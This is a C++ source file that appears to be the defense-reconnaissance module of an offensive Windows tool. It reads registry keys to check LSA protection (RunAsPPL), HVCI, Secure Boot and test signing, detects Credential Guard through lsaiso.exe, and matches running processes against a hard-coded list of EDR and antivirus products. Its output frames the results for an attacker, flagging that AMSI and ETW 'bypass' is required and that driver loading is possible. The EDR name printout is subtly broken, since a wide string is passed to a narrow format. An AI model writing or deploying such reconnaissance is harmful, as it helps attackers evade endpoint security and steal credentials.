#include "defense.h"
#include <cstdio>
#include <cstring>
#include <tlhelp32.h>

bool CheckPPL(DefenseStatus* ds) {
    HKEY hKey;
    DWORD value = 0;
    DWORD size = sizeof(DWORD);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "RunAsPPL", NULL, NULL, (LPBYTE)&value, &size);
        RegCloseKey(hKey);
    }
    ds->ppLEnabled = (value != 0);
    ds->pplLevel = value;
    return ds->ppLEnabled;
}

bool CheckCredentialGuard(DefenseStatus* ds) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe = { sizeof(pe) };
    bool found = false;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsaiso.exe") == 0) {
                found = true;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    ds->credentialGuard = found;
    return found;
}

bool CheckHVCI(DefenseStatus* ds) {
    HKEY hKey;
    DWORD value = 0;
    DWORD size = sizeof(DWORD);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "HypervisorEnforcedCodeIntegrity", NULL, NULL, (LPBYTE)&value, &size);
        RegCloseKey(hKey);
    }
    ds->hvciEnabled = (value == 1);
    return ds->hvciEnabled;
}

bool CheckSecureBoot() {
    // UEFI SecureBoot
    HKEY hKey;
    DWORD value = 0;
    DWORD size = sizeof(DWORD);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "UEFISecureBootEnabled", NULL, NULL, (LPBYTE)&value, &size);
        RegCloseKey(hKey);
    }
    return (value == 1);
}

bool CheckTestSigning() {
    HKEY hKey;
    DWORD value = 0;
    DWORD size = sizeof(DWORD);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\IntegrityServices", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "TestSigning", NULL, NULL, (LPBYTE)&value, &size);
        RegCloseKey(hKey);
    }
    return (value == 1);
}

void DetectEDR(DefenseStatus* ds) {
    const wchar_t* edrProcs[] = {
        L"MsMpEng.exe", L"SenseCncProxy.exe", L"csfalcon.exe", L"Cybereason.exe",
        L"CarbonBlack.exe", L"crowdstrike.exe", L"tanium.exe", L"elastic-endpoint.exe"
    };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            for (int i = 0; i < sizeof(edrProcs) / sizeof(edrProcs[0]); i++) {
                if (_wcsicmp(pe.szExeFile, edrProcs[i]) == 0) {
                    ds->edrPresent = true;
                    wcscpy_s(ds->edrName, 128, pe.szExeFile);
                    break;
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
}

void FullDefenseRecon(DefenseStatus* ds) {
    ZeroMemory(ds, sizeof(DefenseStatus));
    CheckPPL(ds);
    CheckCredentialGuard(ds);
    CheckHVCI(ds);
    ds->secureBoot = CheckSecureBoot();
    ds->testSigning = CheckTestSigning();
    DetectEDR(ds);
    // AMSI/ETW
    ds->amsiActive = true;
    ds->etwActive = true;
}

void PrintDefenseStatus(const DefenseStatus* ds) {
    printf("\n=== Defense Status ===\n");
    printf("PPL enabled       : %s (level %d)\n", ds->ppLEnabled ? "YES" : "NO", ds->pplLevel);
    printf("Credential Guard  : %s\n", ds->credentialGuard ? "ACTIVE" : "absent");
    printf("HVCI              : %s\n", ds->hvciEnabled ? "ENABLED" : "disabled");
    printf("Secure Boot       : %s\n", ds->secureBoot ? "ON" : "OFF");
    printf("Test Signing      : %s\n", ds->testSigning ? "ON (driver loading possible)" : "OFF");
    printf("EDR detected      : %s%s\n", ds->edrPresent ? "YES - " : "NO", ds->edrPresent ? (char*)ds->edrName : "");
    printf("AMSI/ETW assumed active (bypass required)\n");
}